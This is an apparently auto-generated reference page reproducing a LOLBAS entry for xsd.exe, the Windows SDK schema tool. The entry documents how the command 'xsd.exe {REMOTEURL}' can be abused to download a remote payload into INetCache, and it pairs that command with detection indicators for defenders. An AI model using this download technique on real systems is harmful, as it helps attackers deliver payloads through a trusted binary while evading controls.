---
parsed_by: focuslocust
source: lolbas
type: generated
---
# xsd.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `xsd.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/xsd.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [xsd.exe](../../tools/windows/xsd.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | xsd.exe |
| name | xsd.exe |
| type | tool |
| source | lolbas |
| url |  |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@AvihayEldad'
  Person: Avihay Eldad
Author: Avihay Eldad
Commands:
- Category: Download
  Command: xsd.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache
Created: 2024-04-09
Description: XML Schema Definition Tool included with the Windows Software Development Kit (SDK).
Detection:
- IOC: URL on a xsd.exe command line
- IOC: xsd.exe making unexpected network connections or DNS requests
Full_Path:
- Path: C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\bin\NETFX <version> Tools\xsd.exe
Name: xsd.exe
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/xsd.yml
```

## Detection / Analysis Notes

```text
IOC: URL on a xsd.exe command line
```

```text
IOC: xsd.exe making unexpected network connections or DNS requests
```

```text
- IOC: URL on a xsd.exe command line
- IOC: xsd.exe making unexpected network connections or DNS requests
```
